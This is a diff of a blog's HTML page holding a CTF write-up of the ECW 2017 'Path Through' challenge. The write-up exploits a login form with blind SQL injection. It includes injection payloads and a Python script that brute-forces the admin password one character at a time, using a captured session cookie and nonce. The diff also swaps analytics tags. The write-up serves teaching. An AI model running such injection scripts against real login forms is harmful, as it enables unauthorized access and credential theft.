@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="The ECW 2017 is a French Jeopardy challenge organized by the &ldquo;Pôle d&rsquo;Excellence Cyber&rdquo; in partnership with the &ldquo;Région Bretagne&rdquo;, Airbus and Thalès. Path Through is a web challenge based on blind SQL Injection." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/en/writeups/ecw-2017/web-path-through/" />
-<meta property="article:published_time" content="2017-11-30T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2017-11-30T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2017-11-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2017-11-30T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/fr/writeups/ecw-2017/web-path-through/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -204,125 +230,96 @@
   </header>
   <div class="post">
     <p>The ECW 2017 is a French Jeopardy challenge organized by the &ldquo;Pôle d&rsquo;Excellence Cyber&rdquo; in partnership with the &ldquo;Région Bretagne&rdquo;, Airbus and Thalès. Path Through is a web challenge based on blind SQL Injection.</p>
-
 <p>From 06/10 to 22/10 2017, the online challenge is used as a pre-selection for the final Capture The Flag challenge which will start the November 29th 2017 during the European Cyber Week conference in Rennes (France).</p>
-
 <h2 id="discovery">Discovery</h2>
-
 <p>The challenge starts with an authentication form. We are asked to identify with the admin account. The username isn&rsquo;t specified mais we are given the following hint &ldquo;It&rsquo;s a simple username&rdquo;&hellip; Except the guessing part, we think about &ldquo;admin&rdquo; first.</p>
-
-<h2 id="tests-hypothesis">Tests &amp; hypothesis</h2>
-
+<h2 id="tests--hypothesis">Tests &amp; hypothesis</h2>
 <p>As long as we only have this form, all the challenge goal remains in the ability to bypass the authentication form in order to access the administration zone.</p>
-
 <p>We try different kind of injections and we make several connexion attempts. We can notice an error message when the credentials couple is invalid.</p>
-
-<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_1.png" alt="path_through_1" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>So, we have a boolean result. Either it&rsquo;s valid or not. From there, we think about a blind SQL Injection.</p>
-
 <p>The blind SQL Injection is based on the substring() function utilization and the capacity to find the password characters one by one. Let&rsquo;s suppose that the database column is called &ldquo;password&rdquo;, we will test each possible character for it. We want the request to return a true value. To achieve that, we will use the displayed message.</p>
-
 <p>We know that the 4 first flag characters (and so, probably for the password too) are &ldquo;ECW{&rdquo; we can imagine that kind of injection :</p>
-
 <pre><code>username=admin&amp;password=' or substring(password,1,1)='E
-</code></pre>
-
-<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_2.png" alt="path_through_2" class="imgSize"/></center></p>
-
+</code></pre><!-- raw HTML omitted -->
 <p>Ok, that&rsquo;s now sure, we have a blind SQL Injection. Let&rsquo;s exploit it !</p>
-
 <h2 id="exploitation-and-bypass">Exploitation and bypass</h2>
-
 <p>In order to succeed in this exploitation, we have 2 solutions. Manual exploitation by trying to guess each character like this :</p>
-
 <pre><code>username=admin&amp;password=' or substring(password,1,2)='C
 username=admin&amp;password=' or substring(password,1,3)='W
 username=admin&amp;password=' or substring(password,1,4)='E{
-</code></pre>
-
-<p>Or automate it with a script. This second solution is chosen to accelerate the process. Indeed, a manual exploitation would be tedious. However, we know that the flag is a MD5 hash, so, it&rsquo;s only composed of &ldquo;abcdef0123456789&rdquo;.</p>
-
+</code></pre><p>Or automate it with a script. This second solution is chosen to accelerate the process. Indeed, a manual exploitation would be tedious. However, we know that the flag is a MD5 hash, so, it&rsquo;s only composed of &ldquo;abcdef0123456789&rdquo;.</p>
 <p>Then, we can write a small Python script. Don&rsquo;t forget to add the security token and a valid cookie so requests can be valid too.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">#!/usr/bin/python</span>
 
-<pre><code class="language-Python">#!/usr/bin/python
+<span style="color:#75715e">#coding: utf-8</span>
 
-#coding: utf-8
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> sys
+requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings()
 
-import requests
-import string
-import sys
-requests.packages.urllib3.disable_warnings()
-
-## Request needed informations
-BASE_URL = &quot;https://challenge-ecw.fr/chals/web100&quot;
-PARAMS = {
-'username': 'admin',
-'password': '',
-'nonce' : '58109a1ef582bab83c89b9435d455e527b44736e43d64750604f7c2a3012f404ba282e19278431cad17852fa9475b2a01a8ddf9551d6b6cfaa5fa6311ceddb5a',
+<span style="color:#75715e">## Request needed informations</span>
+BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://challenge-ecw.fr/chals/web100&#34;</span>
+PARAMS <span style="color:#f92672">=</span> {
+<span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;admin&#39;</span>,
+<span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>,
+<span style="color:#e6db74">&#39;nonce&#39;</span> : <span style="color:#e6db74">&#39;58109a1ef582bab83c89b9435d455e527b44736e43d64750604f7c2a3012f404ba282e19278431cad17852fa9475b2a01a8ddf9551d6b6cfaa5fa6311ceddb5a&#39;</span>,
 }
 
-## Static variables
-KEYWORD = &quot;Le mot de passe est le flag.&quot;
-MAX_PWD_LENGTH = 255
-URL = &quot;https://challenge-ecw.fr/chals/web100&quot;
-VULNERABLE_PARAM = &quot;password=&quot;
-INJECTION_USED = &quot;username=admin&amp;password=' or substring(password,1,1)='E&quot;
+<span style="color:#75715e">## Static variables</span>
+KEYWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Le mot de passe est le flag.&#34;</span>
+MAX_PWD_LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
+URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://challenge-ecw.fr/chals/web100&#34;</span>
+VULNERABLE_PARAM <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password=&#34;</span>
+INJECTION_USED <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username=admin&amp;password=&#39; or substring(password,1,1)=&#39;E&#34;</span>
 
-## Password variables
-passwordLength = 37
-password = &quot;ECW{&quot;
+<span style="color:#75715e">## Password variables</span>
+passwordLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
+password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ECW{&#34;</span>
 
-if __name__ == &quot;__main__&quot;:
-print(&quot;\n#####################################&quot;)
-print(&quot;## Blind SQL Injection ECW 2017 ##&quot;)
-print(&quot;#####################################\n&quot;)
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">#####################################&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;## Blind SQL Injection ECW 2017 ##&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;#####################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 
-print(&quot;[+] URL injected : %s&quot; % URL)
-print(&quot;[+] Vulnerable parameter : %s&quot; % VULNERABLE_PARAM)
-print(&quot;[+] Injection used : %s&quot; % INJECTION_USED)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] URL injected : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> URL)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Vulnerable parameter : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> VULNERABLE_PARAM)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Injection used : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> INJECTION_USED)
 
-print(&quot;\n[+] Starting bruteforce\n&quot;)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Starting bruteforce</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 
-#req = requests.get(url=BASE_URL, verify=False)
-#token = req.GET['nonce']
-#PARAMS['nonce'] = token
+<span style="color:#75715e">#req = requests.get(url=BASE_URL, verify=False)</span>
+<span style="color:#75715e">#token = req.GET[&#39;nonce&#39;]</span>
+<span style="color:#75715e">#PARAMS[&#39;nonce&#39;] = token</span>
 
-s = requests.Session()
+s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
 
-COOKIE = dict(session=&quot;.eJwNj8tqwzAQRX-lzNoLx003hi4KstMGZoyLYiHt1NixpUgqJBQ_Qv69szucy1ncBwSbRijhcoMM0m86D1A-4OWHFclxQREmVF1kXnWsXSPINyK4RrYbqTYn2QWSX6_aM29YGPZGaObTTP4jN773GKsNRbUa3850OE7ox9XI6g39eU8CF13UV5TM8hi1vHLbOW5mVNXeHL5jI087VG2hvfEm1hMpM5HHBRUF3h2p6h2eGfzdh1uykQ_Ap7UL_7F9dAnKiw33IQPXQ7kr8uc_UPNP7A.DMdGMg.UMD8szIENKxcuos1Rmk0Zqzd_8s&quot;)
+COOKIE <span style="color:#f92672">=</span> dict(session<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.eJwNj8tqwzAQRX-lzNoLx003hi4KstMGZoyLYiHt1NixpUgqJBQ_Qv69szucy1ncBwSbRijhcoMM0m86D1A-4OWHFclxQREmVF1kXnWsXSPINyK4RrYbqTYn2QWSX6_aM29YGPZGaObTTP4jN773GKsNRbUa3850OE7ox9XI6g39eU8CF13UV5TM8hi1vHLbOW5mVNXeHL5jI087VG2hvfEm1hMpM5HHBRUF3h2p6h2eGfzdh1uykQ_Ap7UL_7F9dAnKiw33IQPXQ7kr8uc_UPNP7A.DMdGMg.UMD8szIENKxcuos1Rmk0Zqzd_8s&#34;</span>)
 
-for i in range(5, passwordLength):
-charset = &quot;abcdef0123456789&quot;
-for j in charset:
-sys.stdout.write(&quot;\r&quot;)
-sys.stdout.write(&quot;[+] Password : %s%c&quot; % (password,j))
-sys.stdout.flush()
-PARAMS['password'] = &quot;' or substring(password,1,&quot;+ str(i) +&quot;)='&quot; + password + j
-req = s.post(url=BASE_URL, data=PARAMS, cookies=COOKIE, verify=False)
-if KEYWORD in req.text:
-password += j
-break;
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>, passwordLength):
+charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdef0123456789&#34;</span>
+<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> charset:
+sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
+sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;[+] Password : </span><span style="color:#e6db74">%s%c</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (password,j))
+sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+PARAMS[<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; or substring(password,1,&#34;</span><span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)=&#39;&#34;</span> <span style="color:#f92672">+</span> password <span style="color:#f92672">+</span> j
+req <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>BASE_URL, data<span style="color:#f92672">=</span>PARAMS, cookies<span style="color:#f92672">=</span>COOKIE, verify<span style="color:#f92672">=</span>False)
+<span style="color:#66d9ef">if</span> KEYWORD <span style="color:#f92672">in</span> req<span style="color:#f92672">.</span>text:
+password <span style="color:#f92672">+=</span> j
+<span style="color:#66d9ef">break</span>;
 
-password = password + &quot;}&quot;
-print(&quot;\n[+] Done\n&quot;)
-print(&quot;[+] Password is %s\n&quot; % password)
-</code></pre>
-
-<h2 id="getting-the-flag">Getting the flag</h2>
-
+password <span style="color:#f92672">=</span> password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}&#34;</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Done</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Password is </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> password)
+</code></pre></div><h2 id="getting-the-flag">Getting the flag</h2>
 <p>We execute the previous script and&hellip;</p>
-
-<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_3.png" alt="path_through_3" class="imgSize"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Great ! We have the flag !</p>
-
 <p>So, challenge presenting a basic blind SQL Injection but nevertheless interesting to learn or refresh knowledge !</p>
-
 <h2 id="references">References</h2>
-
 <ul>
-<li><a href="http://www.mcherifi.org/hacking/sql-injection-avancee-blind-sql-injection.html" target="blank">SQL injection avancée: Blind SQL injection</a></li>
+<li><!-- raw HTML omitted -->SQL injection avancée: Blind SQL injection<!-- raw HTML omitted --></li>
 </ul>
   </div>
   
@@ -361,7 +358,7 @@ print(&quot;[+] Password is %s\n&quot; % password)
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
